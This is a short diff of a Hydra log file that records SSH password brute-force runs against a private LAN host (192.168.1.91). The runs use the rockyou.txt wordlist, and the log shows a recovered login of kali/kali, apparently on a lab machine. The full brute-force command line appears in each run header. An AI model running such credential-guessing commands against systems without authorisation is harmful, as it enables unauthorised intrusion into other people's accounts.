@@ -1,4 +1,3 @@
-# Hydra v9.5 run at 2024-03-18 20:50:35 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
-[22][ssh] host: 192.168.1.91   login: kali   password: kali
-# Hydra v9.5 run at 2024-03-18 20:51:48 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
+# Hydra v9.5 run at 2024-03-19 18:51:35 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
+# Hydra v9.5 run at 2024-03-19 18:52:13 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
 [22][ssh] host: 192.168.1.91   login: kali   password: kali
